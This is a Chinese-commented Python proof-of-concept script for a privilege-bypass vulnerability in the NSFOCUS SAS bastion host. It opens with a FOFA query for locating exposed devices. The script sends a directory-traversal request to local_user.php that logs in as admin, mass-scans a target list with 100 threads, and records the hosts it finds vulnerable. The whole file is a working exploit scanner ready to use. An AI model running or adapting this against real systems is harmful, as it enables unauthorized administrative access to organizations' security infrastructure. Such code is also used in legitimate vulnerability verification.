#绿盟 SAS堡垒机 local_user.php 权限绕过漏洞复现
#fofa:body="'/needUsbkey.php'" || body="/login_logo_sas_h_zh_CN.png"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
████████╗██╗   ██╗██████╗ ███████╗    ███████╗ ██████╗ ███╗   ███╗███████╗████████╗██╗  ██╗██╗███╗   ██╗ ██████╗     
╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚══██╔══╝██║  ██║██║████╗  ██║██╔════╝     
   ██║    ╚████╔╝ ██████╔╝█████╗      ███████╗██║   ██║██╔████╔██║█████╗     ██║   ███████║██║██╔██╗ ██║██║  ███╗    
   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝      ╚════██║██║   ██║██║╚██╔╝██║██╔══╝     ██║   ██╔══██║██║██║╚██╗██║██║   ██║    
   ██║      ██║   ██║     ███████╗    ███████║╚██████╔╝██║ ╚═╝ ██║███████╗   ██║   ██║  ██║██║██║ ╚████║╚██████╔╝    
   ╚═╝      ╚═╝   ╚═╝     ╚══════╝    ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     
                                                                                                                     
                                                                                                                                                                                      
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="绿盟SAS堡垒机local_user.php权限绕过漏洞复现")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)Version/12.0.3Safari/605.1.15',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept-Encoding':'gzip',
        'Connection':'close',
    }
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.get(url=target+payload,headers=headers,verify=False,proxies=proxies)
        if res1.status_code==200 and '{"status":200}' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()